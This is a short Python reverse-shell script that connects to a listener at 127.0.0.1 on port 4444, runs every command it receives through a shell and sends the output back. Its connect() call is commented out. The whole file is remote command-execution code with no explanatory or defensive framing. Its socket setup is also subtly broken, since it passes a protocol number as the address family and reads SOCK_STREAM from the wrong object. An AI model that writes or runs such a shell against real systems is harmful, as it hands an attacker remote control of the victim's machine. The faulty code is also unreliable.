import socket
import os
import subprocess

def connect():
    # Create a TCP socket and connect to the listener
    s = socket.socket(socket.getprotobyname('tcp'), socket.socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 4444))

    # Loop to receive and return commands
    while True:
        command = s.recv(1024).decode()
        
        if 'terminate' in command:
            s.close()
            break
        else:
            # Execute the command and capture output/errors
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

# connect() # Uncomment to run